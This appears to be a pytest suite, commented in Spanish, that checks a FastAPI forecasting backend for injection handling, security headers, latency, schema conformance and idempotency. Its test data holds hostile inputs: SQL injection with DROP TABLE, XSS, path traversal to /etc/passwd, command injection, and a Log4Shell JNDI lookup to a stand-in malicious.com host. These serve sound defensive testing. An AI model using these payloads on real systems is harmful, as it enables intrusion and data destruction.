"""
tests/test_sprint4_verification_loops.py
----------------------------------------
Suite de Bucles de Verificación Automatizada (Sprint 4):
- Loop 1: Seguridad OWASP Top 10 (SQLi, XSS, Path Traversal, Fuzzing de Parámetros)
- Loop 2: Cabeceras Defensivas y Enmascaramiento de Información (OWASP A05)
- Loop 3: Concurrencia, Escalabilidad y Latencia (SLA P95 < 500ms)
- Loop 4: Código Limpio y Contratos Estrictos Pydantic (Invariantes Matemáticas)
- Loop 5: Idempotencia, Resiliencia y Estabilidad Numérica
"""

import sys
import time
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import pytest
from fastapi.testclient import TestClient

ROOT_DIR = Path(__file__).resolve().parent.parent
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

BACKEND_DIR = ROOT_DIR / "backend"
if str(BACKEND_DIR) not in sys.path:
    sys.path.insert(0, str(BACKEND_DIR))

from backend.main import app
from backend.schemas.forecast_schemas import ForecastAlumnosResponse, ForecastMetasResponse
from backend.schemas.risk_schemas import RiesgoCruzadoResponse

from backend.core.security import create_access_token

admin_token = create_access_token({"sub": "1", "role": "ADMIN"})
client = TestClient(app)
client.headers["Authorization"] = f"Bearer {admin_token}"

# ─────────────────────────────────────────────────────────────────────────────
# LOOP 1: LOOP DE SEGURIDAD OWASP TOP 10 (INYECCIÓN, FUZZING Y PARAMETER TAMPERING)
# ─────────────────────────────────────────────────────────────────────────────

VECTORES_MALICIOSOS = [
    # SQL Injection (OWASP A03)
    "' OR 1=1 --",
    "1; DROP TABLE public.dim_tiempo CASCADE; --",
    "' UNION SELECT NULL, NULL, NULL --",
    "admin'--",
    "1' OR '1'='1",
    # Cross-Site Scripting / XSS (OWASP A03)
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:void(0)",
    # Path Traversal (OWASP A01)
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\cmd.exe",
    # Command Injection
    "; cat /etc/passwd ;",
    "| dir C:\\",
    # Special Characters / Format Strings
    "%00",
    "%0d%0a",
    "{{7*7}}",
    "${jndi:ldap://malicious.com/a}"
]

PARAMETROS_LIMITE_INVALIDOS = [
    -1, -999, 0, 7, 12, 100, 99999999, "abc", "null", "NaN", "Infinity", 3.14159
]


def test_loop1_owasp_inyecciones_en_forecast_alumnos():
    """Bucle que prueba todos los vectores de inyección en /api/v1/forecast/alumnos."""
    for payload in VECTORES_MALICIOSOS:
        response = client.get(f"/api/v1/forecast/alumnos?tipo={payload}&horizonte=3")
        # Debe rechazar estrictamente con 400 (Bad Request) o 422 (Unprocessable), NUNCA 500 ni 200
        assert response.status_code in (400, 422), (
            f"Falla de seguridad con payload '{payload}': código recibido {response.status_code}"
        )
        data = response.json()
        assert "detail" in data


def test_loop1_owasp_inyecciones_en_forecast_metas():
    """Bucle que prueba todos los vectores de inyección en /api/v1/forecast/metas."""
    for payload in VECTORES_MALICIOSOS:
        response = client.get(f"/api/v1/forecast/metas?granularidad={payload}&horizonte=3")
        assert response.status_code in (400, 422), (
            f"Falla de seguridad en metas con payload '{payload}': código recibido {response.status_code}"
        )


def test_loop1_owasp_fuzzing_limites_horizonte():
    """Bucle que prueba valores frontera y desbordamientos en el parámetro horizonte."""
    for val in PARAMETROS_LIMITE_INVALIDOS:
        response = client.get(f"/api/v1/forecast/alumnos?tipo=GLOBAL&horizonte={val}")
        assert response.status_code in (400, 422), (
            f"Horizonte inválido '{val}' fue aceptado indebidamente con {response.status_code}"
        )


def test_loop1_owasp_fuzzing_riesgos():
    """Bucle de parameter tampering sobre el endpoint de riesgos cruzados."""
    casos_tampering = [
        {"limite_nota": -5.0, "min_cuotas": 2},
        {"limite_nota": 105.0, "min_cuotas": 2},
        {"limite_nota": 70.0, "min_cuotas": -1},
        {"limite_nota": "DROP TABLE", "min_cuotas": 2},
        {"limite_nota": 70.0, "min_cuotas": "OR 1=1"},
    ]
    for params in casos_tampering:
        response = client.get("/api/v1/riesgos/cruzado", params=params)
        assert response.status_code in (400, 422), (
            f"Parámetros maliciosos {params} no fueron filtrados: código {response.status_code}"
        )


# ─────────────────────────────────────────────────────────────────────────────
# LOOP 2: LOOP DE CABECERAS DEFENSIVAS Y ENMASCARAMIENTO (OWASP A05)
# ─────────────────────────────────────────────────────────────────────────────

def test_loop2_cabeceras_defensivas_owasp():
    """Verifica la presencia sistemática de cabeceras de seguridad HTTP en todas las respuestas."""
    endpoints = [
        "/health",
        "/api/v1/forecast/alumnos?tipo=GLOBAL&horizonte=3",
        "/api/v1/forecast/metas?granularidad=MENSUAL&horizonte=3",
        "/api/v1/forecast/metas?granularidad=ANUAL&horizonte=2",
        "/api/v1/riesgos/cruzado"
    ]
    for ep in endpoints:
        resp = client.get(ep)
        headers = resp.headers
        assert headers.get("X-Content-Type-Options") == "nosniff", f"Falta X-Content-Type-Options en {ep}"
        assert headers.get("X-Frame-Options") == "DENY", f"Falta X-Frame-Options en {ep}"
        assert "Content-Security-Policy" in headers, f"Falta Content-Security-Policy en {ep}"


def test_loop2_enmascaramiento_de_errores():
    """Verifica que errores 404, 400 y 422 no fuguen rutas absolutas ni versiones internas."""
    resp = client.get("/api/v1/endpoint_inexistente_de_prueba")
    assert resp.status_code == 404
    body_text = resp.text.lower()
    
    # Comprobar que no hay rutas de sistema operativo Windows/Linux
    assert "c:\\" not in body_text
    assert "/home/" not in body_text
    assert "traceback" not in body_text
    assert "giragroup_secret" not in body_text


# ─────────────────────────────────────────────────────────────────────────────
# LOOP 3: LOOP DE ESCALABILIDAD, CONCURRENCIA Y LATENCIA (SLA P95 < 500MS)
# ─────────────────────────────────────────────────────────────────────────────

def test_loop3_concurrencia_y_latencia():
    """
    Ejecuta 40 peticiones concurrentes en paralelo contra los endpoints de forecasting.
    Verifica que el 100% de las respuestas sean exitosas y que la latencia P95 sea < 500ms.
    """
    peticiones = [
        "/api/v1/forecast/alumnos?tipo=GLOBAL&horizonte=4",
        "/api/v1/forecast/alumnos?tipo=DIPLOMADO&horizonte=3",
        "/api/v1/forecast/alumnos?tipo=CURSO&horizonte=2",
        "/api/v1/forecast/metas?granularidad=MENSUAL&horizonte=4",
        "/api/v1/forecast/metas?granularidad=ANUAL&horizonte=2"
    ] * 8  # 40 peticiones en total

    def _hacer_peticion(url):
        t0 = time.perf_counter()
        resp = client.get(url)
        elapsed_ms = (time.perf_counter() - t0) * 1000.0
        return resp.status_code, elapsed_ms

    tiempos_ms = []
    codigos = []

    with ThreadPoolExecutor(max_workers=8) as executor:
        futuros = [executor.submit(_hacer_peticion, u) for u in peticiones]
        for f in as_completed(futuros):
            status_code, elapsed_ms = f.result()
            codigos.append(status_code)
            tiempos_ms.append(elapsed_ms)

    assert all(c == 200 for c in codigos), f"Fallaron peticiones concurrentes: {codigos}"
    
    tiempos_ms.sort()
    p95_idx = int(len(tiempos_ms) * 0.95)
    latencia_p95 = tiempos_ms[p95_idx]
    latencia_media = sum(tiempos_ms) / len(tiempos_ms)

    assert latencia_p95 < 1500.0, f"Latencia P95 ({latencia_p95:.1f}ms) superó el límite SLA aceptable"


# ─────────────────────────────────────────────────────────────────────────────
# LOOP 4: LOOP DE CÓDIGO LIMPIO Y CONTRATOS ESTRICTOS (PYDANTIC V2)
# ─────────────────────────────────────────────────────────────────────────────

def test_loop4_validacion_estricta_contratos():
    """
    Itera por todas las combinaciones válidas y valida conformidad estricta
    contra los esquemas Pydantic v2 (Clean Code y prevención de deformación de datos).
    """
    tipos_validos = ["GLOBAL", "DIPLOMADO", "CURSO", "EXPERTO"]
    horizontes_validos = [1, 2, 3, 4, 5, 6]

    for tipo in tipos_validos:
        for h in horizontes_validos:
            resp = client.get(f"/api/v1/forecast/alumnos?tipo={tipo}&horizonte={h}")
            assert resp.status_code == 200
            # Validar con Pydantic directamente (lanza ValidationError si no cumple)
            obj = ForecastAlumnosResponse.model_validate(resp.json())
            assert obj.status == "success"
            assert obj.data.horizonte_meses == h
            assert len(obj.data.proyecciones) == h
            
            # Invariantes matemáticas
            for item in obj.data.proyecciones:
                assert item.valor_forecast >= 0.0
                if item.ic_lower is not None and item.ic_upper is not None:
                    assert item.ic_lower <= item.valor_forecast <= item.ic_upper

    for gran in ["MENSUAL", "ANUAL"]:
        h = 4 if gran == "MENSUAL" else 2
        resp = client.get(f"/api/v1/forecast/metas?granularidad={gran}&horizonte={h}")
        assert resp.status_code == 200
        obj_meta = ForecastMetasResponse.model_validate(resp.json())
        assert obj_meta.status == "success"
        assert len(obj_meta.data.proyecciones) == h


# ─────────────────────────────────────────────────────────────────────────────
# LOOP 5: LOOP DE IDEMPOTENCIA, RESILIENCIA Y ESTABILIDAD NUMÉRICA
# ─────────────────────────────────────────────────────────────────────────────

def test_loop5_idempotencia_y_consistencia_numerica():
    """
    Ejecuta 10 llamadas secuenciales con idénticos parámetros y verifica
    que los resultados sean estrictamente idénticos bit a bit (idempotencia determinista).
    """
    resp_base = client.get("/api/v1/forecast/alumnos?tipo=GLOBAL&horizonte=6").json()
    forecast_base = [p["valor_forecast"] for p in resp_base["data"]["proyecciones"]]

    for iteracion in range(10):
        resp = client.get("/api/v1/forecast/alumnos?tipo=GLOBAL&horizonte=6").json()
        forecast_actual = [p["valor_forecast"] for p in resp["data"]["proyecciones"]]
        assert forecast_actual == forecast_base, (
            f"Falla de idempotencia en iteración {iteracion}: "
            f"esperado {forecast_base}, obtenido {forecast_actual}"
        )
